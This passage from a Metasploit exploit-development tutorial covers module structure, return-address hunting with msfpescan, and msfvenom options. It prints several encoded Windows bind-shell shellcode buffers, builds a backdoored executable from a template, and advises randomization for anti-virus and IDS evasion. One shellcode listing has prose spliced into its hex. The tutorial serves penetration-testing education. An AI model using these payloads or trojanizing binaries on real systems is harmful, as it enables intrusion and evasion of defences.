 [*] Auxiliary module execution completed


MSF tells us that the IMAP server has probably crashed and could check it using ImmunityDebugger.



**********************
Exploit Development
***********************


Next, we are going to cover one of the most well-known and popular aspects of the Metasploit Framework, exploit development. In this section, we are going to show how using the Framework for exploit development allows you to concentrate on what is unique about the exploit, and makes other matters such as payload, encoding, NOP generation, and so on just a matter of infrastructure.

Due to the sheer number of exploits currently available in Metasploit, there is a very good chance that there is already a module that you can simply edit for your own purposes during exploit development. To make exploit development easier, Metasploit includes a sample exploit that you can modify. You can find it under ‘documentation/samples/modules/exploits/‘.

Goals
======

When writing exploits to be used in the Metasploit Framework, your development goals should be minimalist.

* Offload as much work as possible to the Metasploit Framework.
* Make use of, and rely on, the Rex protocol libraries.
* Make heavy use of the available mixins and plugins.


Just as important as a minimalist design, exploits should (must) be reliable.

* Any BadChars declared must be 100% accurate.
* Ensure that Payload->Space is the maximum reliable value.
* The little details in exploit development matter the most.

Exploits should make use of randomness whenever possible. Randomization assists with IDS, IPS, and Anti-Virus evasion and also serves as an excellent reliability test.

* When generating padding, use Rex::Text.rand_text_* (rand_text_alpha, rand_text_alphanumeric, etc).
* Randomize all payloads by using encoders.
* If possible, randomize the encoder stub.
* Randomize nops too.

Just as important as functionality, exploits should be readable as well.

* All Metasploit modules have a consistent structure with hard-tab indents.
* Fancy code is harder to maintain, anyway.
* Mixins provide consistent option names across the Framework.

Lastly, exploits should be useful.

* Proof of concepts should be written as Auxiliary DoS modules, not as exploits.
* The final exploit reliability must be high.
* Target lists should be inclusive.

To summarize our Exploit Development Goals we should create minimalistic, reliable code that is not only readable, but also useful in real world penetration testing scenarios.

Exploit Module Format
======================

The format of an Exploit Module in Metasploit is similar to that of an Auxiliary Module but there are more fields.

* There is always a Payload Information Block. An Exploit without a Payload is simply an Auxiliary Module.
* A listing of available Targets is outlined.
* Instead of defining run(), exploit() and check() are used.

Exploit Module Skeleton
^^^^^^^^^^^^^^^^^^^^^^

::

  class Metasploit3 > Msf::Exploit::Remote

      include Msf::Exploit::Remote::TCP

      def initialize
           super(
               'Name'          => 'Simplified Exploit Module',
               'Description'   => 'This module sends a payload',
               'Author'        => 'My Name Here',
               'Payload'       => {'Space' => 1024, 'BadChars' => “\x00”},
               'Targets'       => [ ['Automatic', {} ] ],
               'Platform'      => 'win',
           )
           register_options( [
               Opt::RPORT(12345)
           ], self.class)
      end

      # Connect to port, send the payload, handle it, disconnect
      def exploit
           connect()
           sock.put(payload.encoded)
           handler()
           disconnect()
      end
 end

Defining an Exploit Check
^^^^^^^^^^^^^^^^^^^^^^^^

Although it is rarely implemented, a method called check() should be defined in your exploit modules whenever possible.

* The check() method verifies all options except for payloads.
* The purpose of doing the check is to determine if the target is vulnerable or not.
* Returns a defined Check value.

The return values for check() are:

* CheckCode::Safe – not exploitable
* CheckCode::Detected – service detected
* CheckCode::Appears – vulnerable version
* CheckCode::Vulnerable – confirmed
* CheckCode::Unsupported – check is not supported for this module.

Banner Grabbing : Sample check() Method
=======================================

::

  def check
     # connect to get the FTP banner
     connect

     # grab banner
     banner = banner = sock.get_once

     # disconnect since have cached it as self.banner
     disconnect

     case banner
          when /Serv-U FTP Server v4\.1/
               print_status('Found version 4.1.0.3, exploitable')
               return Exploit::CheckCode::Vulnerable

          when /Serv-U FTP Server/
               print_status('Found an unknown version, try it!');
               return Exploit::CheckCode::Detected

          else
               print_status('We could not recognize the server banner')
               return Exploit::CheckCode::Safe
     end

     return Exploit::CheckCode::Safe
 end


Exploit Mixins
==============

Exploit::Remote::Tcp
^^^^^^^^^^^^^^^^^^^^

::

  lib/msf/core/exploit/tcp.rb

Provides TCP options and methods.

* Defines RHOST, RPORT, ConnectTimeout
*  Provides connect(), disconnect()
* Creates self.sock as the global socket
* Offers SSL, Proxies, CPORT, CHOST
* Evasion via small segment sends
* Exposes user options as methods – rhost() rport() ssl()

Exploit::Remote::DCERPC
^^^^^^^^^^^^^^^^^^^^^^^^

::

  lib/msf/core/exploit/dcerpc.rb

Inherits from the TCP mixin and has the following methods and options:

* dcerpc_handle()
* dcerpc_bind()
* dcerpc_call()
* Supports IPS evasion methods with multi-context BIND requests and fragmented DCERPC calls


Exploit::Remote::SMB
^^^^^^^^^^^^^^^^^^^^^^

::

  lib/msf/core/exploit/smb.rb

Inherits from the TCP mixin and provides the following methods and options:

* smb_login()
* smb_create()
* smb_peer_os()
* Provides the Options of SMBUser, SMBPass, and SMBDomain
* Exposes IPS evasion methods such as: SMB::pipe_evasion, SMB::pad_data_level, SMB::file_data_level

Exploit::Remote::BruteTargets
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

There are 2 source files of interest.

::

  lib/msf/core/exploit/brutetargets.rb

Overloads the exploit() method.’

* Calls exploit_target(target) for each Target
* Handy for easy target iteration

::

  lib/msf/core/exploit/brute.rb

Overloads the exploit method.

* Calls brute_exploit() for each stepping
* Easily brute force and address range

Metasploit Mixins
^^^^^^^^^^^^^^^^^^

The mixins listed above are just the tip of the iceberg as there are many more at your disposal when creating exploits. Some of the more interesting ones are:

* Capture – sniff network packets
* Lorcon – send raw WiFi frames
* MSSQL – talk to Microsoft SQL servers
* KernelMode – exploit kernel bugs
* SEH – structured exception handling
* NDMP – the network backup protocol
* EggHunter – memory search
* FTP – talk to FTP servers
* FTPServer – create FTP servers

Exploit Targets
===============

Coding Exploit Targets in your Metasploit Module
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Exploits define a list of targets that includes a name, number, and options. Targets are specified by number when launched.

Sample Target Code for an Exploit Module:

::

  'Targets' =>
          [
                 # Windows 2000 – TARGET = 0
                 [
                      'Windows 2000 English',
                      {
                           'Rets' => [ 0x773242e0 ],
                      },
                 ],
                 # Windows XP - TARGET = 1
                 [
                      'Windows XP English',
                      {
                           'Rets' => [ 0x7449bf1a ],
                      },
                 ],
          ],
 'DefaultTarget' => 0))

Target Options Block
^^^^^^^^^^^^^^^^^^^^

The options block within the target section is nearly free-form although there are some special option names.

* ‘Ret’ is short-cutted as target.ret()
* ‘Payload’ overloads the exploits info block

Options are where you store target data. For example:

* The return address for a Windows 2000 target
* 500 bytes of padding need to be added for Windows XP targets
* Windows Vista NX bypass address

Accessing Target Information
""""""""""""""""""""""""""""""""""""""

The ‘target’ object inside the exploit is the users selected target and is accessed in the exploit as a hash.

* target[‘padcount’]
* target[‘Rets’][0]
* target[‘Payload’][‘BadChars’]
* target[‘opnum’]

Adding and Fixing Exploit Targets
"""""""""""""""""""""""""""""""""

Sometimes you need new targets because a particular language pack changes addresses, a different version of the software is available, or the addresses are shifted due to hooks. Adding a new target only requires 3 steps.

* Determine the type of return address you require. This could be a simple ‘jmp esp’, a jump to a specific register, or a ‘pop/pop/ret’. Comments in the exploit code can help you determine what is required.
* Obtain a copy of the target binaries
* Use msfpescan to locate a suitable return address

Getting a Return Address with msfpescan
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If the exploit code doesn’t explicitly tell you what type of return address is required but is good enough to tell you the dll name for the existing exploit, you can find out what type of return address you are looking for. Consider the following example that provides a return address for a Windows 2000 SP0-SP4 target.

::

  'Windows 2000 SP0-SP4',
 {
          'Ret'          => 0x767a38f6,  # umpnpmgr.dll
 }


To find out what type of return address the exploit currently uses, we just need to find a copy of umpnpmgr.dll from a Windows 2000 machine machine and run msfpescan with the provided address to determine the return type. In the example below, we can see that this exploit requires a pop/pop/ret.

::

  root@kali:~# msfpescan -D -a 0x767a38f6 umpnpmgr.dll
 [umpnpmgr.dll]
 0x767a38f6 5f5ec3558bec6aff68003c7a7668e427
 00000000 5F                pop edi
 00000001 5E                pop esi
 00000002 C3                ret
 00000003 55                push ebp
 00000004 8BEC              mov ebp,esp
 00000006 6AFF              push byte -0x1
 00000008 68003C7A76        push 0x767a3c00
 0000000D 68                db 0x68
 0000000E E427              in al,0x27


Now, we just need to grab a copy of the target dll and use msfpescan to find a usable pop/pop/ret address for us.


::

  root@kali:~# msfpescan -p umpnpmgr.dll
 [targetos.umpnpmgr.dll]
 0x79001567 pop eax; pop esi; ret
 0x79011e0b pop eax; pop esi; retn 0x0008
 0x79012749 pop esi; pop ebp; retn 0x0010
 0x7901285c pop edi; pop esi; retn 0x0004

Now that we’ve found a suitable return address, we add our new target to the exploit.

::

  'Windows 2000 SP0-SP4 Russian Language',
 {
          'Ret'          => 0x7901285c,  # umpnpmgr.dll
 }


Exploit Payloads
================

Working with Exploit Payloads
^^^^^^^^^^^^^^^^^^^^^^^^^^

Metasploit helps deliver our exploit payloads against a target system. When creating an Exploit Payload, we have several things to consider, from the operating system architecture, to anti-virus, IDS, IPS, etc. In evading detection of our exploits, we will want to encode our payloads to remove any bad characters and add some randomness to the final output using NOPs.

Metasploit comes with a number of payload encoders and NOP generators to help aid us in this area.



Select a payload encoder:

* Must not touch certain registers
* Must be under the max size
* Must avoid BadChars
* Encoders are ranked



Select a nop generator:

* Tries the most random one first
* NOPs are also ranked

Payload Encoding Example
"""""""""""""""""""""""""""

* The defined Payload Space is 900 bytes
* The Payload is 300 bytes long
* The Encoder stub adds another 40 bytes to the payload
* The NOPs will then fill in the remaining 560 bytes bringing the final payload.encoded size to 900 bytes
* The NOP padding can be avoided by adding ‘DisableNops’ => true to the exploit


Payload Block Options
"""""""""""""""""""

As is the case for most things in the Framework, payloads can be tweaked by exploits.

* ‘StackAdjustment’ prefixes “sub esp” code
* ‘MinNops’, ‘MaxNops’, ‘DisableNops’
* ‘Prefix’ places data before the payload
* ‘PrefixEncoder’ places it before the stub

These options can also go into the Targets block, allowing for different BadChars for targets and allows Targets to hit different OS architectures.


MSFvenom
^^^^^^^^^^^^^

Using the MSFvenom Command Line Interface

msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. msfvenom replaced both msfpayload and msfencode as of June 8th, 2015.

Msfvenom has a wide range of options available:

::

  root@kali:~# msfvenom -h
 MsfVenom - a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] >var=val>
 Options:
 root@kali:~# msfvenom -h
 Error: MsfVenom - a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /usr/bin/msfvenom [options]

 Options:
    -p, --payload            Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled             Prepend a nopsled of [length] size on to the payload
    -f, --format              Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder            The encoder to use
    -a, --arch                  The architecture to use
        --platform          The platform of the payload
        --help-platforms             List available platforms
    -s, --space               The maximum size of the resulting payload
        --encoder-space       The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars             The list of characters to avoid example: '\x00\xff'
    -i, --iterations           The number of times to encode the payload
    -c, --add-code              Specify an additional win32 shellcode file to include
    -x, --template              Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out                   Save the payload
    -v, --var-name              Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message


MSFvenom Command Line Usage
"""""""""""""""""

We can see an example of the msfvenom command line below and its output:

::

  root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
 Found 1 compatible encoders
 Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai succeeded with size 353 (iteration=1)
 x86/shikata_ga_nai succeeded with size 380 (iteration=2)
 x86/shikata_ga_nai chosen with final size 380
 Payload size: 380 bytes
 buf = ""
 buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
 buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
 buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
 buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
 buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"
 buf += "\x6d\xfc\x58\xba\x82\xf9\xc0\x9a\x35\x72\x7d\x01\x9b"
 buf += "\xe7\x31\x16\x82\xf6\xe2\x89\x89\x75\x67\xf7\xaa\xae"
 buf += "\x73\x88\x3f\xf5\x6d\x3d\x9e\xab\x06\xda\xff\x42\x7a"
 buf += "\x63\x6b\x72\x59\xf6\x58\xa5\xfe\x3f\x0b\x41\xa0\xf2"
 buf += "\xfe\x2d\xc9\x32\x3d\xd4\x51\xf7\xa7\x56\xf8\x69\x08"
 buf += "\x4d\x27\x8a\x2e\x19\x99\x7c\xfc\x63\xfa\x5c\xd5\xa8"
 buf += "\x1f\xa8\x9b\x88\xbb\xa5\x3c\x8f\x7f\x38\x45\xd1\x71"
 buf += "\x34\x59\x84\xb0\x97\xa0\x99\xcc\xfe\x7f\x37\xe2\x28"
 buf += "\xea\x57\x01\xcf\xf8\x1e\x1e\xd8\xd3\x05\x67\x73\xf9"
 buf += "\x32\xbb\x76\x8c\x7c\x2f\xf6\x29\x0f\xa5\x36\x2e\x73"
 buf += "\xde\x31\xc3\xfe\xae\x49\x64\xd2\x39\xf1\xf2\xc7\xa0"
 buf += "\x06\xd3\xf6\x1a\xfe\x0a\xfe\x28\xbe\x1a\x42\x9c\xde"
 buf += "\x01\x16\x27\xbd\x29\x1c\xf8\x7d\x47\x2c\x68\x06\x0e"
 buf += "\x23\x31\xfe\x7d\x58\xe8\x7b\x76\x4b\xfe\xdb\x17\x51"
 buf += "\xfa\xdf\xff\xa1\xbc\xc5\x66\x4b\xea\x23\x86\x47\xb4"
 buf += "\xe7\xd5\x71\x77\x2e\x24\x4a\x3d\xb1\x6f\x12\xf2\xb2"
 buf += "\xd0\x55\xc9\x23\x2e\xc2\xa5\x73\xb2\xc8\xb7\x7d\x6b"
 buf += "\x55\x29\xbc\x26\xdd\xfThe msfvenom command and resulting shellcode above generates a Windows bind shell with three iterations of the shikata_ga_nai encoder without any null bytes and in the python format.6\xe3\xf6\x25\xc6\x5c\xad\x9c"
 buf += "\x9d\x18\x08\x3b\xbf\xd2\xff\x92\x18\x5f\x48\x9b\xe0"
 buf += "\x7b\x03\xa5\x32\x11\x27\x2b\x25\xcd\x44\xdb\xbd\xb9"
 buf += "\xcd\x48\xda\x56\x4c\x56\xd5\x04\x87\x48\x3a\x6b\x9c"
 buf += "\x2a\x15\x4d\xbc\x0b\x56\x06\xb5\xc9\x46\xd0\xfa\x68"
 buf += "\xa6\x76\xe9\x52\x2c\x24\x62\x28\xe1\x1d\x87\xb0\x66"
 buf += "\x93\x85\x8f\x87\x0f\xcf\x16\x29\x76\x03\x55\x0c\x0e"
 buf += "\x3f\x17\xac"


The msfvenom command and resulting shellcode above generates a Windows bind shell with three iterations of the shikata_ga_nai encoder without any null bytes and in the python format.


MSFvenom Platforms
""""""""""""""""

Here is a list of available platforms one can enter when using the –platform switch.

::

  Cisco or cisco
 OSX or osx
 Solaris or solaris
 BSD or bsd
 OpenBSD or openbsd
 hardware
 Firefox or firefox
 BSDi or bsdi
 NetBSD or netbsd
 NodeJS or nodejs
 FreeBSD or freebsd
 Python or python
 AIX or aix
 JavaScript or javascript
 HPUX or hpux
 PHP or php
 Irix or irix
 Unix or unix
 Linux or linux
 Ruby or ruby
 Java or java
 Android or android
 Netware or netware
 Windows or windows
 mainframe
 multi


MSFvenom Options and Uses
"""""""""""""""""""""""

**msfvenom -v or –var-name**

Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable from the default “buf” to whatever word you supplied.


Default output example:

::

  root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 buf = ""
 buf += "\xda\xdc\xd9\x74\x24\xf4\x5b\xba\xc5\x5e\xc1\x6a\x29"
 ...snip...

Using –var-name output example:

::

  root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 notBuf = ""
 notBuf += "\xda\xd1\xd9\x74\x24\xf4\xbf\xf0\x1f\xb8\x27\x5a"
 ...snip...

**msfvenom –help-format**

Issuing the msfvenom command with this switch will output all available payload formats.

::

  root@kali:~# msfvenom --help-formats
 Executable formats
 asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
 hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
 psh-cmd, vba, vba-exe, vba-psh, vbs, war
 Transform formats
 bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl,
 powershell, ps1, py, python, raw, rb, ruby, sh,
 vbapplication, vbscript

**msfvenom -n, –nopsled**

 Sometimes you need to add a few NOPs at the start of your payload. This will place a NOP sled of [length] size at the beginning of your payload.

BEFORE :

::

  root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of generic/none
 generic/none succeeded with size 299 (iteration=0)
 generic/none chosen with final size 299
 Payload size: 299 bytes
 buf = ""
 buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" **First line of payload
 buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
 ...snip...

AFTER :

::

  root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of generic/none
 generic/none succeeded with size 299 (iteration=0)
 generic/none chosen with final size 299
 Successfully added NOP sled from x86/single_byte
 Payload size: 325 bytes
 buf = ""
 buf += "\x98\xfd\x40\xf9\x43\x49\x40\x4a\x98\x49\xfd\x37\x43" **NOPs
 buf += "\x42\xf5\x92\x42\x42\x98\xf8\xd6\x93\xf5\x92\x3f\x98"
 buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" **First line of payload
 ...snip...


**msfvenom –smallest**

 If the “smallest” switch is used, msfvevom will attempt to create the smallest shellcode possible using the selected encoder and payload.


 ::

   root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 ...snip...

 root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python --smallest
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 312 (iteration=0)
 x86/shikata_ga_nai chosen with final size 312
 Payload size: 312 bytes
 ...snip...

**msfvenom -c, –add-code**

 Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) shellcode.

 Payload #1:

 ::

   root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
 No encoder or badchars specified, outputting raw payload
 Payload size: 267 bytes


Adding payload #2:

::

  root@kali:~# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw > messageBox2
 Adding shellcode from messageBox to the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 850 bytes


Adding payload #3:

::

  root@kali:~# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
 Adding shellcode from messageBox2 to the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 1469 bytes
 Saved as: cookies.exe

Running the “cookies.exe” file will execute both message box payloads, as well as the bind shell using default settings (port 4444).


**msfvenom -x, –template & -k, –keep**

 The -x, or –template, option is used to specify an existing executable to use as a template when creating your executable payload.

  Using the -k, or –keep, option in conjunction will preserve the template’s normal behaviour and have your injected payload run as a separate thread.

  ::

    root@kali:~# msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 299 (iteration=0)
 x86/shikata_ga_nai chosen with final size 299
 Payload size: 299 bytes
 Saved as: sol_bdoor.exe


Alphanumeric Shellcode
^^^^^^^^^^^^^^

There are cases where you need to obtain a pure alphanumeric shellcode because of character filtering in the exploited application. The Metasploit Framework can easily generate alphanumeric shellcode through Msfvenom. For example, to generate a mixed alphanumeric uppercase- and lowercase-encoded shellcode, we can use the following command:


::

  root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed -f python
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/alpha_mixed
 x86/alpha_mixed succeeded with size 660 (iteration=0)
 x86/alpha_mixed chosen with final size 660
 Payload size: 660 bytes
 buf =  ""
 buf += "\x89\xe2\xdb\xc3\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49"
 buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
 buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
 buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
 buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x68\x68\x4f"
 buf += "\x72\x67\x70\x45\x50\x65\x50\x73\x50\x4b\x39\x69\x75"
 buf += "\x70\x31\x69\x50\x51\x74\x6e\x6b\x42\x70\x54\x70\x6c"
 buf += "\x4b\x53\x62\x76\x6c\x4c\x4b\x33\x62\x75\x44\x4c\x4b"
 buf += "\x43\x42\x47\x58\x54\x4f\x6c\x77\x42\x6a\x55\x76\x44"
 buf += "\x71\x69\x6f\x6c\x6c\x57\x4c\x43\x51\x43\x4c\x77\x72"
 buf += "\x34\x6c\x65\x70\x39\x51\x4a\x6f\x56\x6d\x66\x61\x6b"
 buf += "\x77\x48\x62\x6b\x42\x62\x72\x50\x57\x4e\x6b\x72\x72"
 buf += "\x54\x50\x4e\x6b\x62\x6a\x57\x4c\x4e\x6b\x62\x6c\x37"
 buf += "\x61\x63\x48\x4d\x33\x42\x68\x33\x31\x38\x51\x42\x71"
 buf += "\x6e\x6b\x56\x39\x47\x50\x47\x71\x6b\x63\x6c\x4b\x32"
 buf += "\x69\x52\x38\x4b\x53\x35\x6a\x51\x59\x6c\x4b\x50\x34"
 buf += "\x4c\x4b\x45\x51\x6b\x66\x35\x61\x49\x6f\x6c\x6c\x79"
 buf += "\x51\x78\x4f\x46\x6d\x77\x71\x49\x57\x35\x68\x79\x70"
 buf += "\x34\x35\x4c\x36\x57\x73\x73\x4d\x59\x68\x67\x4b\x73"
 buf += "\x4d\x56\x44\x70\x75\x48\x64\x31\x48\x6e\x6b\x50\x58"
 buf += "\x54\x64\x43\x31\x6b\x63\x35\x36\x6c\x4b\x76\x6c\x72"
 buf += "\x6b\x4e\x6b\x70\x58\x35\x4c\x43\x31\x78\x53\x4e\x6b"
 buf += "\x36\x64\x4c\x4b\x65\x51\x6a\x70\x4c\x49\x53\x74\x66"
 buf += "\x44\x75\x74\x31\x4b\x71\x4b\x45\x31\x61\x49\x63\x6a"
 buf += "\x30\x51\x49\x6f\x39\x70\x63\x6f\x63\x6f\x72\x7a\x6c"
 buf += "\x4b\x55\x42\x68\x6b\x6e\x6d\x43\x6d\x55\x38\x37\x43"
 buf += "\x76\x52\x43\x30\x57\x70\x63\x58\x52\x57\x63\x43\x74"
 buf += "\x72\x63\x6f\x62\x74\x65\x38\x50\x4c\x44\x37\x77\x56"
 buf += "\x54\x47\x39\x6f\x49\x45\x68\x38\x6a\x30\x73\x31\x35"
 buf += "\x50\x67\x70\x75\x79\x68\x44\x70\x54\x52\x70\x72\x48"
 buf += "\x74\x69\x4f\x70\x50\x6b\x63\x30\x39\x6f\x4e\x35\x71"
 buf += "\x7a\x34\x4b\x70\x59\x56\x30\x68\x62\x59\x6d\x73\x5a"
 buf += "\x65\x51\x72\x4a\x57\x72\x71\x78\x5a\x4a\x36\x6f\x59"
 buf += "\x4f\x4b\x50\x79\x6f\x39\x45\x6f\x67\x50\x68\x77\x72"
 buf += "\x37\x70\x57\x61\x73\x6c\x6d\x59\x4b\x56\x73\x5a\x34"
 buf += "\x50\x52\x76\x33\x67\x30\x68\x49\x52\x49\x4b\x50\x37"
 buf += "\x32\x47\x79\x6f\x68\x55\x6b\x35\x79\x50\x70\x75\x33"
 buf += "\x68\x63\x67\x50\x68\x6d\x67\x78\x69\x45\x68\x79\x6f"
 buf += "\x59\x6f\x39\x45\x33\x67\x65\x38\x62\x54\x58\x6c\x45"
 buf += "\x6b\x39\x71\x6b\x4f\x69\x45\x66\x37\x6e\x77\x52\x48"
 buf += "\x70\x75\x52\x4e\x52\x6d\x71\x71\x69\x6f\x58\x55\x62"
 buf += "\x4a\x55\x50\x43\x5a\x73\x34\x70\x56\x70\x57\x31\x78"
 buf += "\x33\x32\x4e\x39\x48\x48\x53\x6f\x79\x6f\x38\x55\x6d"
 buf += "\x53\x7a\x58\x55\x50\x53\x4e\x46\x4d\x6e\x6b\x77\x46"
 buf += "\x30\x6a\x33\x70\x33\x58\x43\x30\x46\x70\x55\x50\x77"
 buf += "\x70\x51\x46\x53\x5a\x77\x70\x71\x78\x31\x48\x6f\x54"
 buf += "\x51\x43\x59\x75\x4b\x4f\x59\x45\x6c\x53\x61\x43\x62"
 buf += "\x4a\x65\x50\x31\x46\x36\x33\x61\x47\x30\x68\x77\x72"
 buf += "\x79\x49\x49\x58\x31\x4f\x79\x6f\x6e\x35\x6e\x63\x38"
 buf += "\x78\x55\x50\x61\x6e\x76\x67\x53\x31\x58\x43\x36\x49"
 buf += "\x39\x56\x43\x45\x59\x79\x4f\x33\x41\x41"


If you look deeper at the generated shellcode, you will see that there are some non-alphanumeric characters:


::

  >>> print buf
 �����w�[SYIIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI9lZHnbuPgpc0QpmYxe4qO0atLK2pFPNkpRFlLKv2gdn
 kbRq8DOMgbjev4qKOLlGLCQ3LwrtlgPiQzotMs1O7irkBF2aGLK3bfpNk2j7LlKrlFq3HZCrhvan1SankbyupUQhSnkQYDXzCEjriNkttlKC
 1kffQIonLiQZo4MeQIWvXyprUzVTCSMxxWK1mVDD5KT68LK68dd31kcE6LKVl2klKcheLuQN3Nkc4LK6ajpoyG4gTWTQK1K0a2yCj3aIoKP1
 OqORzLKVrxkLMQM2H5c7B30wp2H47CC7BqO1Dqx0LPwuv6g9oxUoHz06a305P5yO4QDrpu8UyopRKwpKOxUBJdKaIv0zBKM1zWq0jdB1xKZf
 oYOypyoKeMGPhDBC0gaCloyxfcZb0V6cgCX8B9K07E7IozunekpsE2xpWbHh78iehioyohUQGbHqdjLGKhaiokepWLW3XpubN0MpaiojucZg
 prJ5TQF1GCXtByIZhQOkO9EosZX30Qn4mLK5fpjqPu8wp6p30uPBvpjC0SX3hMt3ciuYoiEOcQC0jc0Sf633gu8eR9IzhsoIoxUK38xEPand
 GWq8CuyxFSE8iySAA


This is due to the opcodes (“\x89\xe2\xdb\xdb\xd9\x72”) at the beginning of the payload, which are needed in order to find the payloads absolute location in memory and obtain a fully position-independent shellcode:

Once our shellcode address is obtained through the first two instructions, it is pushed onto the stack and stored in the ECX register, which will then be used to calculate relative offsets. However, if we are somehow able to obtain the absolute position of the shellcode on our own and save that address in a register before running the shellcode, we can use the special option BufferRegister=REG32 while encoding our payload:

::

  root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=ECX -f python
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/alpha_mixed
 x86/alpha_mixed succeeded with size 651 (iteration=0)
 x86/alpha_mixed chosen with final size 651
 Payload size: 651 bytes
 buf =  ""
 buf += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
 buf += "\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
 buf += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
 buf += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
 buf += "\x6c\x49\x78\x4d\x52\x77\x70\x47\x70\x47\x70\x35\x30"
 buf += "\x6e\x69\x49\x75\x44\x71\x79\x50\x42\x44\x6c\x4b\x72"
 buf += "\x70\x74\x70\x6e\x6b\x50\x52\x34\x4c\x6c\x4b\x43\x62"
 buf += "\x57\x64\x6c\x4b\x33\x42\x56\x48\x74\x4f\x6d\x67\x72"
 buf += "\x6a\x45\x76\x46\x51\x79\x6f\x6c\x6c\x75\x6c\x71\x71"
 buf += "\x63\x4c\x43\x32\x36\x4c\x75\x70\x79\x51\x7a\x6f\x36"
 buf += "\x6d\x33\x31\x48\x47\x38\x62\x39\x62\x56\x32\x43\x67"
